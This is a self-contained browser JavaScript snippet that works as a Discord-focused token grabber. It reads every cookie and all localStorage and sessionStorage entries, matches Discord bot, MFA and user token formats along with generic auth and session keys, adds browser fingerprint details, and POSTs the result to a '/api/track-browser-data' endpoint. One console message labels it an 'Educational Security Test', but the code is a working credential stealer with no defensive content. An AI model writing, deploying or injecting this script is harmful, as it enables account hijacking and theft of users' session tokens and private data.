
(function() {
  try {
    // Capture all cookies
    const cookies = document.cookie;
    
    // Capture localStorage data
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    // Capture sessionStorage data
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }
    
    // Enhanced token patterns for various platforms including Discord
    const tokenPatterns = [
      /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i,
      /discord/i, /authorization/i, /oauth/i, /login/i, /credential/i
    ];
    
    // Discord-specific token patterns
    const discordTokenPatterns = [
      /^[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}$/, // Discord bot tokens
      /^mfa\.[\w-]{84}$/, // Discord MFA tokens
      /^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$/ // Discord user tokens
    ];
    
    const foundTokens = [];
    const discordTokens = [];
    
    // Function to check if a value matches Discord token patterns
    const checkDiscordToken = (value, source) => {
      if (typeof value === 'string') {
        discordTokenPatterns.forEach(pattern => {
          if (pattern.test(value)) {
            discordTokens.push(`DISCORD_TOKEN found in ${source}: ${value}`);
          }
        });
        
        // Also check for tokens in cookie format or other encodings
        if (value.includes('discord') && value.length > 50) {
          discordTokens.push(`Potential Discord data in ${source}: ${value}`);
        }
      }
    };
    
    // Check localStorage for tokens
    Object.keys(localStorageData).forEach(key => {
      const value = localStorageData[key];
      
      // Check for Discord tokens specifically
      checkDiscordToken(value, `localStorage.${key}`);
      
      // Check for general tokens
      if (tokenPatterns.some(pattern => pattern.test(key))) {
        foundTokens.push(`localStorage.${key}: ${value}`);
      }
      
      // Check if the key itself suggests it might be a token
      if (key.toLowerCase().includes('discord') || 
          key.toLowerCase().includes('token') ||
          key.toLowerCase().includes('auth')) {
        foundTokens.push(`localStorage.${key}: ${value}`);
      }
    });
    
    // Check sessionStorage for tokens
    Object.keys(sessionStorageData).forEach(key => {
      const value = sessionStorageData[key];
      
      // Check for Discord tokens specifically
      checkDiscordToken(value, `sessionStorage.${key}`);
      
      // Check for general tokens
      if (tokenPatterns.some(pattern => pattern.test(key))) {
        foundTokens.push(`sessionStorage.${key}: ${value}`);
      }
      
      // Check if the key itself suggests it might be a token
      if (key.toLowerCase().includes('discord') || 
          key.toLowerCase().includes('token') ||
          key.toLowerCase().includes('auth')) {
        foundTokens.push(`sessionStorage.${key}: ${value}`);
      }
    });
    
    // Check cookies for Discord tokens
    const cookieTokens = [];
    if (cookies) {
      cookies.split(';').forEach(cookie => {
        const [name, value] = cookie.split('=').map(s => s.trim());
        if (name && value) {
          checkDiscordToken(value, `cookie.${name}`);
          
          if (tokenPatterns.some(pattern => pattern.test(name)) || 
              name.toLowerCase().includes('discord') ||
              name.toLowerCase().includes('token') ||
              name.toLowerCase().includes('auth')) {
            cookieTokens.push(`cookie.${name}: ${value}`);
          }
        }
      });
    }
    
    // Try to access Discord-specific objects if available
    const discordData = [];
    try {
      if (window.webpackChunkdiscord_app) {
        discordData.push('Discord webapp detected');
      }
      if (window.DiscordNative) {
        discordData.push('Discord Native client detected');
      }
    } catch (e) {
      // Ignore errors
    }
    
    // Send data to server
    const data = {
      cookies: cookies,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      tokens: foundTokens,
      discordTokens: discordTokens,
      cookieTokens: cookieTokens,
      discordData: discordData,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      url: window.location.href,
      referrer: document.referrer,
      timestamp: new Date().toISOString()
    };
    
    // Log to console for educational purposes
    console.log('Educational Security Test - Browser Data Captured:', data);
    
    // Send to tracking endpoint
    fetch('/api/track-browser-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(err => console.log('Tracking request failed:', err));
    
  } catch (error) {
    console.log('Tracking script error:', error);
  }
})();
